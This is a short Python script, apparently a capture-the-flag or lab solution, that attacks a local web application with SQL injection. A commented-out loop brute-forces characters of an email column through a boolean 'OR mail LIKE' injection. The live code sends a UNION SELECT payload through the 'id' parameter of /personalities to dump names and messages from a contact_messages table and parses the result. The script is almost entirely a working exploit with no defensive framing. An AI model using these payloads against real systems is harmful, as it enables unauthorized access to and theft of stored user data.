import requests
from bs4 import BeautifulSoup

letters = "abcdefghijklmnopqrstuvwxzy"
"""
for letter in letters:
    input = "' OR mail LIKE" + letter + " '%' #"
    data = {'name': input}

    headers = {'Accept-Encoding': 'Identify'}
    response = requests.post('http://0.0.0.0:80/messages', data)
    #print(response.text)

    soup = BeautifulSoup(response.text, 'html.parser')

    mydivs = soup.findAll("div", {"class": "alert alert-success"})

    if mydivs != []:
        print(letter)

"""


#headers = {'Accept-Encoding': 'Identify'}
#input = "http://0.0.0.0:80/personalities?id=7 union select * from contact_messages where mail like 'james@bond.mi5' OR '1'='1"
GETRequest = "http://0.0.0.0:80/personalities?id=777%27+UNION+SELECT+name,+message+FROM+contact_messages+WHERE+mail=%27james@bond.mi5%27+%23"
response = requests.get(GETRequest)
print(response.text)

soup = BeautifulSoup(response.text, 'html.parser')

myDivs = soup.findAll("a", {"class": "list-group-item"})
print(myDivs)
